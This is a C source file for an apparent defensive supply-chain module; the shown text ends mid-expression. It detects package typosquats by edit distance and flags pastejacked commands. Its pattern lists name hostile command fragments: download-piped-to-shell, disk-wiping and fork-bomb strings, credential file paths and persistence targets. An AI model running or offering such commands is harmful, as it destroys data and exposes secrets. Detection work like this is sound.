/*
 * hlse_supply.c — Supply Chain Defense Module
 *
 * Protects against three human-layer supply chain attack vectors:
 *
 *   S1. Package typosquatting  — "pip install reqeusts" (→ requests)
 *   S2. Pastejacking           — hostile commands hidden in copied text
 *   S3. Dependency confusion   — internal package names leaking to public
 *
 * Key insight: typosquatting detection reuses the same Damerau-Levenshtein
 * algorithm used for URL typosquat detection in hlse_core.c. Package
 * registries are just another namespace where humans mistype names.
 *
 * All detection is pure functions. Zero network access. Zero dependencies
 * beyond libc.
 *
 * Build: gcc -O2 -c hlse_supply.c -I.
 */

#define _POSIX_C_SOURCE 200809L

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <ctype.h>

#include "hlse_supply.h"
#include "hlse_util.h"

/* ═══════════════════════════════════════════════════════════════════════
 * Damerau-Levenshtein distance — delegates to shared hlse_util.
 * ═══════════════════════════════════════════════════════════════════════ */

static int
dl_distance(const char *a, const char *b) {
    return hlse_edit_distance(a, b);
}

/* Map common ecosystem aliases to the canonical registry label used in
 * REGISTRIES ("pip", "npm", "cargo", "go", "gem"). Users say "pypi" or
 * "python" for pip, "crates" for cargo, "rubygems" for gem, etc. — and the
 * CLI help itself advertises "pypi".
 *
 * Returns the canonical label, or NULL when the alias is unknown. A NULL
 * result makes the caller scan ALL registries: a security check must never
 * silently pass just because the caller spelled the ecosystem differently
 * than the internal label (that would be a false-negative — the user thinks
 * they checked the package and got a clean result). */
static const char *
canonical_ecosystem(const char *eco) {
    char low[32];
    size_t i;
    if (!eco || !eco[0]) return NULL;       /* unspecified → scan all       */
    for (i = 0; eco[i] && i < sizeof(low) - 1; i++) {
        char c = eco[i];
        low[i] = (c >= 'A' && c <= 'Z') ? (char)(c + 32) : c;
    }
    low[i] = '\0';

    if (!strcmp(low, "pip")    || !strcmp(low, "pypi")   ||
        !strcmp(low, "python") || !strcmp(low, "pip3")   ||
        !strcmp(low, "pypi.org"))                          return "pip";
    if (!strcmp(low, "npm")    || !strcmp(low, "node")   ||
        !strcmp(low, "nodejs") || !strcmp(low, "yarn")   ||
        !strcmp(low, "pnpm")   || !strcmp(low, "npmjs"))   return "npm";
    if (!strcmp(low, "cargo")  || !strcmp(low, "crates") ||
        !strcmp(low, "crates.io") || !strcmp(low, "rust"))  return "cargo";
    if (!strcmp(low, "go")     || !strcmp(low, "golang") ||
        !strcmp(low, "gomod")  || !strcmp(low, "go.mod"))   return "go";
    if (!strcmp(low, "gem")    || !strcmp(low, "rubygems") ||
        !strcmp(low, "ruby")   || !strcmp(low, "bundler"))  return "gem";
    return NULL;                            /* unknown → fail safe, scan all */
}

/* ═══════════════════════════════════════════════════════════════════════
 * S1: Package Typosquatting Detection
 *
 * Top packages for each ecosystem. Only the most popular are needed —
 * attackers target typosquats of high-download packages.
 * ═══════════════════════════════════════════════════════════════════════ */

static const char *PIP_TOP[] = {
    "requests", "numpy", "pandas", "flask", "django", "boto3",
    "tensorflow", "torch", "pytorch", "scipy", "matplotlib",
    "pillow", "cryptography", "pyyaml", "sqlalchemy", "jinja2",
    "beautifulsoup4", "selenium", "scrapy", "celery",
    "fastapi", "uvicorn", "pydantic", "httpx", "aiohttp",
    "pytest", "setuptools", "wheel", "pip", "virtualenv",
    "black", "mypy", "ruff", "isort", "flake8",
    "paramiko", "fabric", "ansible", "docker", "kubernetes",
    "stripe", "twilio", "sendgrid", "openai", "anthropic",
    "transformers", "langchain", "chromadb", "pinecone",
    "scikit-learn", "xgboost", "lightgbm", "huggingface-hub", "datasets",
    "wandb", "mlflow", "click", "rich", "typer",
    /* High-growth data / infrastructure — active typosquat targets */
    "polars", "dask", "numba", "sympy", "statsmodels",
    "gunicorn", "psycopg2", "redis", "python-dotenv", "pycryptodome",
    /* AI/LLM ecosystem 2024 — active typosquat campaigns */
    "llama-index", "llama_index", "autogen", "crewai", "litellm",
    "qdrant-client", "weaviate-client", "instructor", "haystack-ai",
    /* Azure SDK — targeted due to enterprise credential access */
    "azure-core", "azure-storage-blob", "azure-identity",
    "azure-keyvault-secrets", "azure-mgmt-core",
    /* Monitoring / observability */
    "sentry-sdk", "opentelemetry-api",
    /* Web3 / crypto — typosquat targets for seed-phrase-stealing payloads */
    "web3", "eth-account", "eth-utils", "web3py", "solana", "bitcoinlib",
    /* Highest-download infra packages — every one has had a documented
     * typosquat incident (colourama→colorama PyPI 2017, python3-dateutil
     * shipped malware Dec 2019, urllib3/requests-family dist-1 lures)   */
    "colorama", "urllib3", "six", "certifi", "idna",
    "charset-normalizer", "python-dateutil", "tqdm", "pyjwt",
    "markupsafe", "werkzeug", "packaging", "attrs",
    "botocore", "rsa", "pygments", "docutils", "humanize",
    "opencv-python", "importlib-metadata",
    NULL
};

static const char *NPM_TOP[] = {
    "express", "react", "vue", "angular", "next", "lodash",
    "axios", "moment", "webpack", "typescript", "eslint",
    "prettier", "jest", "mocha", "chai", "cypress",
    "socket.io", "mongoose", "sequelize", "prisma",
    "tailwindcss", "postcss", "autoprefixer", "vite",
    "nodemon", "pm2", "dotenv", "cors", "helmet",
    "jsonwebtoken", "bcrypt", "passport", "uuid",
    "chalk", "commander", "inquirer", "yargs", "debug",
    "fs-extra", "glob", "rimraf", "cross-env", "concurrently",
    "openai", "langchain", "firebase", "stripe", "aws-sdk",
    "underscore", "rxjs", "date-fns", "zod", "three",
    "d3", "svelte", "nuxt", "graphql", "webpack-cli",
    /* Modern tooling — high-value typosquat targets */
    "vitest", "playwright", "dayjs", "turbo", "esbuild",
    "framer-motion", "storybook", "remix", "astro", "typeorm",
    /* AI/LLM and cloud tooling 2024 */
    "chromadb", "anthropic", "wrangler", "drizzle-orm", "hono",
    "react-query", "better-sqlite3", "sharp", "ioredis", "bullmq",
    "trpc", "next-auth", "nuxt-auth", "lucia", "pocketbase",
    /* High-download utility packages — frequent typosquat campaign targets */
    "semver", "minimist", "node-fetch", "cross-fetch",
    "node-cache", "winston", "morgan", "multer",
    "socket.io-client", "ws", "got", "supertest",
    /* Cloud providers and infra */
    "aws-cdk", "serverless", "netlify-cli", "vercel",
    /* Web3 / crypto — wallet-drainer malware ships as fake ethers/web3 pkgs */
    "ethers", "web3", "wagmi", "viem", "hardhat",
    "@solana/web3.js", "@walletconnect/client", "web3modal",
    /* Documented npm supply-chain victims — ua-parser-js (Oct 2021
     * cryptominer/RAT hijack), coa+rc (Nov 2021), node-ipc (Mar 2022
     * sabotage), event-stream (flatmap-stream payload 2018), colors+
     * faker (Jan 2022 maintainer sabotage) — typosquats of these are
     * worth flagging because the real packages are ubiquitous      */
    "ua-parser-js", "coa", "rc", "node-ipc", "event-stream",
    "colors", "faker", "bootstrap", "jquery", "core-js",
    "tslib", "is-core-module", "inherits", "safe-buffer",
    NULL
};

static const char *CARGO_TOP[] = {
    "serde", "tokio", "reqwest", "clap", "rand", "regex",
    "chrono", "log", "env_logger", "anyhow", "thiserror",
    "serde_json", "hyper", "actix-web", "axum", "warp",
    "diesel", "sqlx", "rusqlite", "redis",
    "rayon", "crossbeam", "parking_lot", "dashmap",
    "tracing", "tower", "tonic", "prost",
    "sha2", "aes", "ring", "rustls",
    "nom", "syn", "bytes", "futures", "async-trait",
    "serde_yaml", "toml", "indexmap", "itertools", "uuid",
    /* Additional popular crates */
    "rocket", "jsonwebtoken", "mongodb", "openssl", "curve25519-dalek",
    /* 2024 high-growth / high-value typosquat targets */
    "tauri", "leptos", "dioxus", "bevy", "embassy",
    "tokio-tungstenite", "axum-core", "tower-http",
    "sea-orm", "sea-query", "dotenvy",
    /* ML / AI inference — HuggingFace candle, burn, ONNX runtime */
    "candle-core", "candle-nn", "candle-transformers",
    "burn", "burn-core", "burn-tensor",
    "ort", "ndarray", "linfa",
    /* Cryptography / PKI */
    "rcgen", "webpki", "x509-parser", "p256", "ed25519-dalek",
    "chacha20poly1305", "argon2", "pbkdf2",
    NULL
};

static const char *GO_TOP[] = {
    "gin", "echo", "fiber", "chi", "gorilla",
    "gorm", "sqlx", "pgx", "mongo-driver",
    "grpc", "protobuf", "wire", "fx",
    "zap", "logrus", "zerolog", "viper", "cobra",
    "testify", "gomock", "ginkgo",
    "aws-sdk-go", "azure-sdk-for-go", "google-cloud-go",
    "redis", "jwt-go", "validator", "cron", "migrate",
    /* High-value additions 2024 */
    "mux", "httprouter", "negroni", "iris",
    "urfave", "spf13", "hashicorp",
    "golang-jwt", "paseto", "casbin",
    "sarama", "confluent-kafka-go", "nats",
    "docker", "kubernetes", "helm",
    /* Security / crypto — targeted due to credential access */
    "go-jose", "golang-jwt", "oauth2",
    /* Secrets management — SOPS, Vault client */
    "sops", "vault",
    /* AI/LLM tooling 2024 */
    "langchaingo", "go-openai",
    NULL
};

static const char *GEM_TOP[] = {
    "rails", "rake", "bundler", "rspec", "devise", "sidekiq",
    "puma", "unicorn", "sinatra", "activerecord", "activesupport",
    "capistrano", "pundit", "cancancan", "kaminari", "paperclip",
    "carrierwave", "omniauth", "warden", "bcrypt", "dotenv-rails",
    "faraday", "httparty", "rest-client", "aws-sdk-ruby",
    "stripe", "twilio-ruby", "sendgrid-ruby",
    "nokogiri", "pg", "mysql2", "sqlite3", "redis",
    "rswag", "factory_bot_rails", "shoulda-matchers",
    /* High-value targets — active typosquat campaigns */
    "dry-validation", "dry-monads", "sorbet", "rubocop",
    /* Audit / security gems */
    "paper_trail", "brakeman",
    /* Background job / caching */
    "delayed_job", "whenever",
    NULL
};

typedef struct {
    const char        *name;
    const char *const *packages;
} Registry;

static const Registry REGISTRIES[] = {
    { "pip",   PIP_TOP },
    { "npm",   NPM_TOP },
    { "cargo", CARGO_TOP },
    { "go",    GO_TOP },
    { "gem",   GEM_TOP },
    { NULL, NULL }
};

/* Known typosquat attack patterns:
 * - Character swap: requsets → requests
 * - Missing char: reqests → requests
 * - Extra char: requestss → requests
 * - Hyphen confusion: python-dateutil vs python_dateutil
 * - Scope confusion: @types/lodash vs types-lodash              */
static int
normalize_pkg_name(const char *src, char *dst, size_t cap) {
    size_t i, j = 0;
    for (i = 0; src[i] && j < cap - 1; i++) {
        char c = src[i];
        /* Normalize: underscore → hyphen, strip whitespace */
        if (c == '_') c = '-';
        if (c == ' ' || c == '\t') continue;
        dst[j++] = (c >= 'A' && c <= 'Z') ? c + 32 : c;
    }
    dst[j] = '\0';
    return (int)j;
}

PackageVerdict
hlse_check_package(const char *pkg_name, const char *ecosystem) {
    PackageVerdict v;
    char norm[128];
    int ri;
    const char *eco_canon;

    memset(&v, 0, sizeof(v));
    int best_dist = 99, best_idx = -1;

    if (!pkg_name || !pkg_name[0]) return v;
    normalize_pkg_name(pkg_name, norm, sizeof(norm));
    eco_canon = canonical_ecosystem(ecosystem);

    for (ri = 0; REGISTRIES[ri].name; ri++) {
        const char *const *pkgs;
        int pi;

        /* Filter by ecosystem when the caller named a recognized one. An
         * unrecognized alias yields eco_canon == NULL → scan every registry
         * (fail safe) rather than silently matching nothing.              */
        if (eco_canon && strcmp(eco_canon, REGISTRIES[ri].name) != 0)
            continue;

        pkgs = REGISTRIES[ri].packages;
        for (pi = 0; pkgs[pi]; pi++) {
            char norm_ref[128];
            int dist;

            normalize_pkg_name(pkgs[pi], norm_ref, sizeof(norm_ref));

            /* Exact match → safe. Record WHICH registry recognised it: the
             * caller uses a non-empty reason here to tell "known-good name"
             * apart from "name I have never heard of". Both are score 0 with
             * 0 matches, but they carry very different residual risk — see the
             * package blind-spot text in hlse_core.c. */
            if (strcmp(norm, norm_ref) == 0) {
                v.score = 0;
                v.n_matches = 0;
                snprintf(v.reason, sizeof(v.reason),
                         "Known package: '%s' is a recognised %s package.",
                         pkgs[pi], REGISTRIES[ri].name);
                hlse_sanitize_display(v.reason);
                return v;
            }

            dist = dl_distance(norm, norm_ref);
            /* dist 1-2: typosquat band. dist 3: slopsquat advisory — a
             * name that close to a top package but absent from the
             * snapshot is exactly where AI-hallucinated names land and
             * where attackers register them. Low score: LOG, not ALERT. */
            if (dist <= 3 && dist > 0 &&
                v.n_matches < HLSE_SUPPLY_MAX_MATCHES)
            {
                int score_add = (dist == 1) ? 50 : (dist == 2) ? 35 : 15;
                snprintf(v.matches[v.n_matches].legit_name,
                         sizeof(v.matches[0].legit_name), "%s", pkgs[pi]);
                snprintf(v.matches[v.n_matches].registry,
                         sizeof(v.matches[0].registry), "%s",
                         REGISTRIES[ri].name);
                v.matches[v.n_matches].distance = dist;
                v.n_matches++;
                if (dist < best_dist) { best_dist = dist; best_idx = v.n_matches - 1; }

                if (score_add > v.score) v.score = score_add;
            }
        }
    }

    /* Amplifier: a single distance-1 neighbour and NO other dist≤2 match →
     * very likely typosquat. Dist-3 slopsquat matches are advisory only:
     * they must not dilute the amplifier (reqeusts ~ requests@1 plus a
     * reqwest@3 still fires) nor inflate the near-match count that gates
     * it (reqests ~ requests@1 + reqwest@2 stays at the 2-match ALERT
     * band). */
    {
        int n_close = 0, i;
        for (i = 0; i < v.n_matches; i++)
            if (v.matches[i].distance <= 2) n_close++;
        if (n_close == 1 && best_dist == 1) {
            v.score = 70;
            snprintf(v.reason, sizeof(v.reason),
                     "Typosquat alert: '%s' is 1 edit from '%s' (%s). "
                     "Did you mean '%s'?",
                     pkg_name, v.matches[best_idx].legit_name,
                     v.matches[best_idx].registry,
                     v.matches[best_idx].legit_name);
        } else if (v.n_matches > 0 && best_dist == 3) {
            snprintf(v.reason, sizeof(v.reason),
                     "Slopsquat candidate: '%s' is 3 edits from '%s' (%s) and "
                     "not a known package — AI-hallucinated names are "
                     "predictable attacker registrations; verify it exists "
                     "before installing",
                     pkg_name, v.matches[best_idx].legit_name,
                     v.matches[best_idx].registry);
        } else if (v.n_matches > 0) {
            snprintf(v.reason, sizeof(v.reason),
                     "Possible typosquat: '%s' is close to %d known package(s)",
                     pkg_name, v.n_matches);
        }
    }

    if (v.score > 100) v.score = 100;
    /* Reason text embeds the caller-supplied package name. */
    hlse_sanitize_display(v.reason);
    return v;
}

/* ═══════════════════════════════════════════════════════════════════════
 * S2: Pastejacking Detection
 *
 * Detects hostile content in text that a user copies from the web:
 *
 *   P1. Hidden newlines    — executes before user can review
 *   P2. curl|bash patterns — remote code execution
 *   P3. Unicode control    — right-to-left override, zero-width chars
 *   P4. Sudo/su injection  — privilege escalation in pasted command
 *   P5. Encoded payloads   — base64 -d | sh, python -c "..."
 *   P6. History evasion    — commands starting with space (bash)
 *   P7. Background exec    — trailing & hides process
 *   P8. Windows LOLBin     — "ClickFix" PowerShell/mshta/certutil one-liners
 * ═══════════════════════════════════════════════════════════════════════ */

/* Case-insensitive substring search. `needle` MUST be lowercase ASCII.
 * O(n*m), fine for paste-sized text; avoids allocating a lowercased copy. */
static int
ci_contains(const char *hay, const char *needle) {
    size_t nl = strlen(needle);
    if (nl == 0) return 1;
    for (; *hay; hay++) {
        size_t k = 0;
        while (k < nl && hay[k] &&
               (char)tolower((unsigned char)hay[k]) == needle[k])
            k++;
        if (k == nl) return 1;
    }
    return 0;
}

PasteVerdict
hlse_check_paste(const char *text) {
    PasteVerdict v;
    size_t len;

    memset(&v, 0, sizeof(v));
    if (!text) return v;
    len = strlen(text);
    if (len == 0) return v;

    /* P1: Hidden newlines — if text contains \n and looks like a command,
     * the first line executes immediately on terminal paste.            */
    {
        const char *nl = strchr(text, '\n');
        if (nl && (nl - text) < (int)len - 1) {
            /* Check if the first line looks like a command */
            if (text[0] != '#' && len > 5) {
                v.signals |= PASTE_HIDDEN_NEWLINE;
                v.score += 25;
                snprintf(v.reasons[v.n_reasons++], sizeof(v.reasons[0]),
                    "P1: Hidden newline at position %d — first line "
                    "auto-executes on terminal paste",
                    (int)(nl - text));
            }
        }
    }

    /* P2: curl/wget piped to shell */
    {
        int has_curl = (strstr(text, "curl ") != NULL ||
                       strstr(text, "wget ") != NULL ||
                       strstr(text, "fetch ") != NULL ||
                       strstr(text, "lynx ") != NULL);
        int has_pipe_sh = (strstr(text, "| sh") != NULL ||
                          strstr(text, "| bash") != NULL ||
                          strstr(text, "|sh") != NULL ||
                          strstr(text, "|bash") != NULL ||
                          strstr(text, "| sudo") != NULL ||
                          strstr(text, "| /bin/sh") != NULL ||
                          strstr(text, "| /bin/bash") != NULL ||
                          /* interpreter cradles — same RCE class */
                          strstr(text, "| python") != NULL ||
                          strstr(text, "| perl") != NULL ||
                          strstr(text, "| node") != NULL ||
                          strstr(text, "| ruby") != NULL ||
                          strstr(text, "| php") != NULL ||
                          strstr(text, "|pwsh") != NULL ||
                          strstr(text, "| pwsh") != NULL ||
                          strstr(text, "| powershell") != NULL ||
                          strstr(text, "| zsh") != NULL ||
                          strstr(text, "| fish") != NULL ||
                          strstr(text, "| dash") != NULL ||
                          strstr(text, "| ksh") != NULL);
        if (has_curl && has_pipe_sh) {
            v.signals |= PASTE_CURL_PIPE_SH;
            v.score += 40;
            if (v.n_reasons < HLSE_PASTE_MAX_REASONS)
                snprintf(v.reasons[v.n_reasons++], sizeof(v.reasons[0]),
                    "P2: Remote code execution — download piped to shell");
        }
    }

    /* P3: Unicode control characters */
    {
        size_t i;
        int rtl_found = 0, zwc_found = 0;
        for (i = 0; i + 2 < len; i++) {
            unsigned char b0 = (unsigned char)text[i];
            unsigned char b1 = (unsigned char)text[i+1];
            unsigned char b2 = (unsigned char)text[i+2];

            /* U+202E RIGHT-TO-LEFT OVERRIDE = E2 80 AE */
            if (b0 == 0xE2 && b1 == 0x80 && b2 == 0xAE) rtl_found = 1;
            /* U+200B ZERO WIDTH SPACE = E2 80 8B */
            if (b0 == 0xE2 && b1 == 0x80 && b2 == 0x8B) zwc_found = 1;
            /* U+200D ZERO WIDTH JOINER = E2 80 8D */
            if (b0 == 0xE2 && b1 == 0x80 && b2 == 0x8D) zwc_found = 1;
            /* U+FEFF BOM / ZERO WIDTH NO-BREAK = EF BB BF */
            if (b0 == 0xEF && b1 == 0xBB && b2 == 0xBF && i > 0)
                zwc_found = 1;
        }
        if (rtl_found) {
            v.signals |= PASTE_UNICODE_CONTROL;
            v.score += 50;
            if (v.n_reasons < HLSE_PASTE_MAX_REASONS)
                snprintf(v.reasons[v.n_reasons++], sizeof(v.reasons[0]),
                    "P3: RIGHT-TO-LEFT OVERRIDE character — "
                    "real content may be visually hidden");
        }
        if (zwc_found) {
            v.signals |= PASTE_UNICODE_CONTROL;
            v.score += 20;
            if (v.n_reasons < HLSE_PASTE_MAX_REASONS)
                snprintf(v.reasons[v.n_reasons++], sizeof(v.reasons[0]),
                    "P3: Zero-width Unicode character — content may differ "
                    "from what is displayed");
        }
    }

    /* P4: Sudo / su injection */
    if (strstr(text, "sudo ") || strstr(text, "su -c") ||
        strstr(text, "doas ")) {
        v.signals |= PASTE_SUDO_INJECTION;
        v.score += 15;
        if (v.n_reasons < HLSE_PASTE_MAX_REASONS)
            snprintf(v.reasons[v.n_reasons++], sizeof(v.reasons[0]),
                "P4: Privilege escalation command (sudo/su/doas)");
    }

    /* P5: Encoded payloads */
    if (strstr(text, "base64 -d") || strstr(text, "base64 --decode") ||
        strstr(text, "python -c") || strstr(text, "python3 -c") ||
        strstr(text, "perl -e") || strstr(text, "ruby -e") ||
        strstr(text, "node -e") || strstr(text, "php -r") ||
        (strstr(text, "echo ") && strstr(text, "| base64"))) {
        v.signals |= PASTE_ENCODED_PAYLOAD;
        v.score += 30;
        if (v.n_reasons < HLSE_PASTE_MAX_REASONS)
            snprintf(v.reasons[v.n_reasons++], sizeof(v.reasons[0]),
                "P5: Encoded/interpreted payload — obfuscated command");
    }

    /* P6: History evasion — starts with space */
    if (text[0] == ' ' && len > 3) {
        v.signals |= PASTE_HISTORY_EVASION;
        v.score += 15;
        if (v.n_reasons < HLSE_PASTE_MAX_REASONS)
            snprintf(v.reasons[v.n_reasons++], sizeof(v.reasons[0]),
                "P6: Leading space — command won't appear in shell history");
    }

    /* P7: Background execution */
    {
        const char *last_amp = strrchr(text, '&');
        if (last_amp && (last_amp[1] == '\0' || last_amp[1] == '\n') &&
            !(last_amp > text && last_amp[-1] == '&')) {  /* not && */
            v.signals |= PASTE_BACKGROUND_EXEC;
            v.score += 10;
            if (v.n_reasons < HLSE_PASTE_MAX_REASONS)
                snprintf(v.reasons[v.n_reasons++], sizeof(v.reasons[0]),
                    "P7: Trailing '&' — command runs in background, "
                    "harder to notice");
        }
    }

    /* P9: Destructive commands — the classic baited one-liner */
    if (strstr(text, "rm -rf /") || strstr(text, "rm -rf ~") ||
        strstr(text, "rm -rf $HOME") || strstr(text, "rm -fr /") ||
        strstr(text, ":(){ :|:") ||
        strstr(text, "mkfs.") || strstr(text, "mkfs /") ||
        strstr(text, "mkfs -") || strstr(text, "mke2fs /") ||
        strstr(text, "of=/dev/sd") || strstr(text, "of=/dev/nvme") ||
        strstr(text, "of=/dev/hd") || strstr(text, "of=/dev/vd") ||
        strstr(text, "of=/dev/mmc") || strstr(text, "of=/dev/xvd") ||
        strstr(text, "if=/dev/mem") || strstr(text, "if=/dev/kmem") ||
        strstr(text, "if=/dev/sd") || strstr(text, "if=/dev/nvme") ||
        strstr(text, "blkdiscard /") || strstr(text, "blkdiscard -") ||
        strstr(text, "shred ") || strstr(text, "> /dev/sd") ||
        strstr(text, "chmod -R 777") || strstr(text, "chmod -R 777 /") ||
        /* c238: storage/volume/RAID destruction */
        strstr(text, "nvme format") || strstr(text, "nvme sanitize") ||
        strstr(text, "sg_sanitize") || strstr(text, "sg_format") ||
        strstr(text, "sg_write_buffer") ||
        (strstr(text, "hdparm") &&
         (strstr(text, "--security-erase") ||
          strstr(text, "--security-disable"))) ||
        (strstr(text, "storcli") && strstr(text, "delete")) ||
        (strstr(text, "perccli") && strstr(text, "delete")) ||
        (strstr(text, "megacli") &&
         (strstr(text, "-CfgLdDel") || strstr(text, "-CfgClr"))) ||
        (strstr(text, "arcconf") && strstr(text, "delete")) ||
        (strstr(text, "hpssacli") && strstr(text, "delete")) ||
        (strstr(text, "omconfig") && strstr(text, "action=delete")) ||
        (strstr(text, "mdadm") &&
         (strstr(text, "--stop") || strstr(text, "--zero-superblock") ||
          strstr(text, "--fail") || strstr(text, "--remove"))) ||
        strstr(text, "pvremove ") || strstr(text, "vgremove ") ||
        strstr(text, "lvremove ") || strstr(text, "lvreduce ") ||
        strstr(text, "dmsetup remove") ||
        (ci_contains(text, "cryptsetup") &&
         (ci_contains(text, "erase") || ci_contains(text, "luksformat"))) ||
        strstr(text, "zfs destroy") || strstr(text, "zpool destroy") ||
        strstr(text, "zpool labelclear") ||
        (strstr(text, "btrfs") &&
         (strstr(text, "subvolume delete") ||
          strstr(text, "device delete"))) ||
        strstr(text, "sfdisk --delete") || strstr(text, "sfdisk /") ||
        (strstr(text, "parted") &&
         (strstr(text, " rm ") || strstr(text, "mklabel"))) ||
        strstr(text, "fdisk /") || strstr(text, "gdisk /") ||
        strstr(text, "cgdisk /") ||
        (strstr(text, "camcontrol") &&
         (strstr(text, "format") || strstr(text, "sanitize"))) ||
        (strstr(text, "vdo ") &&
         (strstr(text, "remove") || strstr(text, "delete") ||
          strstr(text, "stop"))) ||
        (strstr(text, "stratis") && strstr(text, "destroy")) ||
        /* c242: BSD partition/crypto destruction + mkfs-family
         * newfs aliases */
        (ci_contains(text, "gpart") &&
         (ci_contains(text, "destroy") || ci_contains(text, "delete") ||
          ci_contains(text, "wipe"))) ||
        (ci_contains(text, "geli") &&
         (ci_contains(text, "kill") || ci_contains(text, "clear") ||
          ci_contains(text, "detach"))) ||
        (ci_contains(text, "gbde") &&
         (ci_contains(text, "destroy") || ci_contains(text, "nuke") ||
          ci_contains(text, "init"))) ||
        (ci_contains(text, "newfs") && ci_contains(text, "/dev/")) ||
        (ci_contains(text, "growfs") && ci_contains(text, "-y")) ||
        /* c240: macOS + tape/firmware/raw-sector destruction */
        (ci_contains(text, "diskutil") &&
         (ci_contains(text, "erasedisk") || ci_contains(text, "erasevolume") ||
          ci_contains(text, "zerodisk") || ci_contains(text, "secureerase") ||
          ci_contains(text, "partitiondisk") ||
          ci_contains(text, "deletecontainer") ||
          ci_contains(text, "deletevolume") ||
          ci_contains(text, "apfs delete") || ci_contains(text, "apfs erase"))) ||
        ci_contains(text, "sg_erase") ||
        (ci_contains(text, "hdparm") &&
         (ci_contains(text, "--write-sector") ||
          ci_contains(text, "--fwdownload") ||
          ci_contains(text, "--dco-identify") ||
          ci_contains(text, "--dco-restore") ||
          ci_contains(text, "--trim-sector-ranges"))) ||
        (ci_contains(text, "mt ") &&
         (ci_contains(text, " -f") &&
          (ci_contains(text, "erase") || ci_contains(text, "compression"))))) {
        v.signals |= PASTE_DESTRUCTIVE;
        v.score += 60;
        if (v.n_reasons < HLSE_PASTE_MAX_REASONS)
            snprintf(v.reasons[v.n_reasons++], sizeof(v.reasons[0]),
                "P9: Destructive payload — recursive delete/disk wipe/"
                "fork bomb");
    }

    /* P10: Credential-file access — reading private keys/credentials is
     * the pre-exfiltration step of pastejacking */
    if (strstr(text, ".ssh/id_") || strstr(text, "id_rsa") ||
        strstr(text, "id_ed25519") || strstr(text, ".ssh/authorized_keys") ||
        strstr(text, ".aws/credentials") || strstr(text, ".aws/config") ||
        strstr(text, ".gnupg/") || strstr(text, ".kube/config") ||
        strstr(text, ".docker/config.json") || strstr(text, ".netrc") ||
        strstr(text, ".git-credentials") || strstr(text, "shadow") ||
        strstr(text, "/etc/passwd") || strstr(text, ".pgpass") ||
        strstr(text, ".my.cnf") || strstr(text, ".pypirc") ||
        strstr(text, ".s3cfg") || strstr(text, ".boto") ||
        strstr(text, ".env") || strstr(text, "master.passwd") ||
        strstr(text, "/etc/security") || strstr(text, "/etc/group") ||
        strstr(text, "/etc/sudoers") || strstr(text, "sudoers.d") ||
        strstr(text, "/etc/login.defs") || strstr(text, "config/gcloud") ||
        strstr(text, ".azure") || strstr(text, "_history") ||
        strstr(text, ".viminfo") || strstr(text, ".lesshst") ||
        strstr(text, ".wget-hsts") || strstr(text, "auth.log") ||
        strstr(text, "/var/log/secure") || strstr(text, "/var/log/btmp") ||
        strstr(text, "/var/log/wtmp") || strstr(text, "/var/log/lastlog") ||
        strstr(text, "/var/log/faillog")) {
        v.signals |= PASTE_CRED_ACCESS;
        v.score += 40;
        if (v.n_reasons < HLSE_PASTE_MAX_REASONS)
            snprintf(v.reasons[v.n_reasons++], sizeof(v.reasons[0]),
                "P10: Credential/key file access — private key, cloud "
                "creds, or auth database read (pre-exfiltration)");
    }

    /* P11: Persistence writes — appending to rc/config/ssh/crontab
     * installs the payload to run on every login. Copy/move/install
     * verbs only fire on system-level targets (routine home-dir
     * backups must stay clean).                                 */
    if (((strstr(text, ">>") || strstr(text, "echo ") ||
          strstr(text, "crontab") || strstr(text, "at now") ||
          strstr(text, "systemctl enable") || strstr(text, "launchctl load") ||
          strstr(text, "tee /") || strstr(text, "tee .") ||
          strstr(text, "tee ~") || strstr(text, "tee -") ||
          strstr(text, "curl ") ||
          strstr(text, "wget ")) &&
         (strstr(text, ".bashrc") || strstr(text, ".zshrc") ||
          strstr(text, ".profile") || strstr(text, "authorized_keys") ||
          strstr(text, "crontab") || strstr(text, "systemctl enable") ||
          strstr(text, "launchctl") || strstr(text, "rc.local") ||
          strstr(text, ".xinitrc") || strstr(text, ".zshenv") ||
          strstr(text, ".bash_profile") || strstr(text, ".bash_login") ||
          strstr(text, ".zprofile") || strstr(text, ".zlogin") ||
          strstr(text, ".xprofile") || strstr(text, ".pam_environment") ||
          strstr(text, "ld.so.preload") || strstr(text, "cron.d") ||
          strstr(text, "spool/cron") || strstr(text, "autostart") ||
          strstr(text, "systemd/system") || strstr(text, "inetd") ||
          strstr(text, "xinetd") || strstr(text, "/etc/profile") ||
          strstr(text, "profile.d") || strstr(text, "init.d") ||
          strstr(text, ".forward") || strstr(text, ".ssh/config") ||
          strstr(text, "/etc/zshrc") || strstr(text, "/etc/zprofile") ||
          strstr(text, "/etc/zshenv") || strstr(text, ".ssh/rc") ||
          strstr(text, "motd.d") || strstr(text, "pam.d") ||
          strstr(text, "sshd_config") || strstr(text, "rc.d") ||
          strstr(text, "systemd/user") || strstr(text, "udev/rules") ||
          strstr(text, "sysctl.d") || strstr(text, "ld.so.conf") ||
          strstr(text, "pacman.d") || strstr(text, "/etc/environment") ||
          strstr(text, "/etc/timezone") || strstr(text, "/etc/hosts") ||
          strstr(text, "resolv.conf") || strstr(text, "nsswitch") ||
          strstr(text, ".vimrc") || strstr(text, ".tmux.conf") ||
          strstr(text, "config.fish") || strstr(text, ".netrc") ||
          strstr(text, ".rhosts") || strstr(text, "hosts.equiv") ||
          strstr(text, ".npmrc") || strstr(text, ".curlrc") ||
          strstr(text, ".gitconfig") || strstr(text, ".xsession") ||
          strstr(text, ".bash_logout") || strstr(text, ".zlogout") ||
          strstr(text, "ssh_config") || strstr(text, ".gtkrc") ||
          strstr(text, ".Xresources") || strstr(text, ".xmodmaprc") ||
          strstr(text, ".inputrc") || strstr(text, ".screenrc") ||
          strstr(text, ".muttrc") || strstr(text, ".mailrc") ||
          strstr(text, ".procmailrc") || strstr(text, ".pinerc") ||
          strstr(text, ".lynxrc") || strstr(text, ".wgetrc") ||
          strstr(text, ".git-crypt") || strstr(text, ".config/git") ||
          strstr(text, ".gnomerc") || strstr(text, ".kderc") ||
          strstr(text, "kdeglobals") || strstr(text, "kglobalshortcutsrc") ||
          strstr(text, "kwinrc") || strstr(text, ".config/pulse") ||
          strstr(text, ".config/systemd") ||
          strstr(text, ".local/share/applications") ||
          strstr(text, "environment.d") || strstr(text, ".ssh/environment") ||
          strstr(text, ".ssh/sshrc") ||
          strstr(text, "native-messaging-hosts") ||
          strstr(text, "NativeMessagingHosts") ||
          strstr(text, ".vscode/extensions") || strstr(text, ".config/Code") ||
          strstr(text, ".gcloud") || strstr(text, "sources.list") ||
